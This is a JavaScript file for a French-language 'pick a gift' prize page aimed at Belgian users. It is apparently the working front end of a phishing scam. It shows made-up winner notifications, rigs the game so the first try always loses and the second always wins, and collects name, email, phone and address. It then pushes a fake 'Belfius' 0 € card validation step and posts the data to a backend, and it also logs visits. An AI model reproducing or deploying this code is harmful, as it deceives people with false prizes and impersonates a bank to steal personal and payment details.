// Game state
let selectedGift = null;
let attempts = 0;
let winAmount = 0;
let paymentMethod = '';
let isSubmitting = false;

const gifts = {1: "Cadeau 1", 2: "Cadeau 2", 3: "Cadeau 3", 4: "Cadeau 4"};
const fakeWinners = [
  { name: "Marie D.", amount: 2500, location: "Bruxelles" },
  { name: "Jean L.", amount: 3200, location: "Anvers" },
  { name: "Sophie M.", amount: 1800, location: "Gand" },
  { name: "Pierre R.", amount: 4100, location: "Liège" },
  { name: "Emma B.", amount: 2900, location: "Bruges" },
  { name: "Lucas T.", amount: 3700, location: "Namur" }
];

// Initialize winner notifications
function initNotifications() {
  setTimeout(showWinnerNotification, 3000);
  setInterval(() => {
    if (Math.random() > 0.3) showWinnerNotification();
  }, Math.random() * 4000 + 8000);
}

function showWinnerNotification() {
  const winner = fakeWinners[Math.floor(Math.random() * fakeWinners.length)];
  document.getElementById('winnerName').textContent = `${winner.name} de ${winner.location}`;
  document.getElementById('winnerAmount').textContent = `€${winner.amount}`;
  document.getElementById('winnerNotification').classList.remove('hidden');
  setTimeout(() => {
    document.getElementById('winnerNotification').classList.add('hidden');
  }, 4000);
}

function closeNotification() {
  document.getElementById('winnerNotification').classList.add('hidden');
}

// Game logic
function selectGift(giftId) {
  if (attempts >= 2) return;
  
  selectedGift = giftId;
  document.getElementById('selectedGiftName').textContent = gifts[giftId];
  document.getElementById('selectedMessage').classList.remove('hidden');
  
  playGame();
}

function playGame() {
  attempts++;
  document.getElementById('attemptCount').textContent = attempts;
  document.getElementById('attemptsDisplay').classList.remove('hidden');

  if (attempts === 1) {
    // First try - always lose
    setTimeout(() => {
      document.getElementById('firstTryGiftName').textContent = gifts[selectedGift];
      showScreen('firstTryResult');
      
      setTimeout(() => {
        showScreen('mainGame');
        document.getElementById('encouragementMessage').classList.remove('hidden');
      }, 2000);
    }, 1000);
  } else if (attempts === 2) {
    // Second try - always win
    winAmount = Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
    
    setTimeout(() => {
      showScreen('processing');
      
      setTimeout(() => {
        showWinnerScreen();
      }, 2000);
    }, 1000);
  }
}

function showScreen(screenId) {
  // Hide all screens
  const screens = ['mainGame', 'firstTryResult', 'processing', 'winnerScreen'];
  screens.forEach(id => {
    document.getElementById(id).classList.add('hidden');
  });
  
  // Show selected screen
  document.getElementById(screenId).classList.remove('hidden');
}

function showWinnerScreen() {
  document.getElementById('winAmount').textContent = winAmount;
  //document.getElementById('winAmountForm').textContent = winAmount;
  document.getElementById('winAmountBtn').textContent = winAmount;
  
  showScreen('winnerScreen');
  startConfetti();
  setTimeout(stopConfetti, 5000);
}

// Confetti animation
function startConfetti() {
  const container = document.getElementById('confettiContainer');
  const colors = ['#c30045', '#e11d48', '#fda4af', '#ffffff', '#fbbf24'];
  
  for (let i = 0; i < 50; i++) {
    const confetti = document.createElement('div');
    confetti.className = 'confetti';
    confetti.style.left = Math.random() * 100 + '%';
    confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
    confetti.style.animationDelay = (i * 100) + 'ms';
    confetti.style.animationDuration = (3000 + Math.random() * 2000) + 'ms';
    container.appendChild(confetti);
  }
}

function stopConfetti() {
  document.getElementById('confettiContainer').innerHTML = '';
}

// Payment method selection
function selectPayment(method) {
  paymentMethod = 'method';
  document.getElementById('hiddenMethod').value = method;
  
  // Update button states
  document.getElementById('cardBtn').classList.remove('active');
  document.getElementById('bankBtn').classList.remove('active');
  document.getElementById(method + 'Btn').classList.add('active');
  
  // Update payment info
  const infoText = method === 'card' 
    ? '<strong>Validation instantanée de votre carte Belfius</strong><br/>Effectuez une transaction instantanée et sécurisée de <b>0 €</b> pour confirmer votre carte.<br>Cette étape permet de valider votre moyen de paiement et d’activer la réception immédiate de votre récompense..'
    : '<strong>Validation sous 24h de votre carte</strong><br/>Effectuez une transaction instantanée et sécurisée de <b>0 €</b> pour confirmer votre carte.<br>Cette étape permet de valider votre moyen de paiement et d’activer la réception immédiate de votre récompense..';
  
  document.getElementById('paymentInfoText').innerHTML = infoText;
  document.getElementById('paymentInfo').classList.remove('hidden');
  
  updateSubmitButton();
}

// Form validation
function updateSubmitButton() {
  const fullName = document.getElementById('fullName').value.trim();
  const email = document.getElementById('email').value.trim();
  const phone = document.getElementById('phone').value.trim();
  const address = document.getElementById('address').value.trim();
  
  let isValid = fullName && email && phone && address;
  
  document.getElementById('submitBtn').disabled = !isValid || isSubmitting;
}

// Form submission
function submitForm(event) {
  event.preventDefault();
  if (isSubmitting) return;
  
  isSubmitting = true;
  const submitBtn = document.getElementById('submitBtn');
  submitBtn.innerHTML = '⏳ Traitement en cours...';
  submitBtn.disabled = true;
  
  // Set hidden field values before submission
  document.getElementById('hiddenWinAmount').value = winAmount;
  document.getElementById('hiddenMethod').value = paymentMethod;
  
  // Parse address to extract city and postal code
  const address = document.getElementById('address').value;
  const addressParts = address.split(',').map(part => part.trim());
  if (addressParts.length > 1) {
    document.getElementById('hiddenCity').value = addressParts[1] || '';
  }
  if (addressParts.length > 2) {
    document.getElementById('hiddenPostal').value = addressParts[2] || '';
  }
  
  // Submit the form normally (will go to PHP)
  event.target.submit();
}

// Event listeners
document.addEventListener('DOMContentLoaded', () => {
  // Add input listeners for form validation
  const inputs = ['fullName', 'email', 'phone', 'address'];
  inputs.forEach(id => {
    const element = document.getElementById(id);
    if (element) {
      element.addEventListener('input', updateSubmitButton);
    }
  });
  
  // Initialize notifications
  initNotifications();
});

// Envoi d'un ping au serveur pour logger un nouveau visiteur
try {
  window.addEventListener('load', function() {
    fetch('visit-log', { method: 'POST' }).catch(function(){});
  });
} catch (e) {}
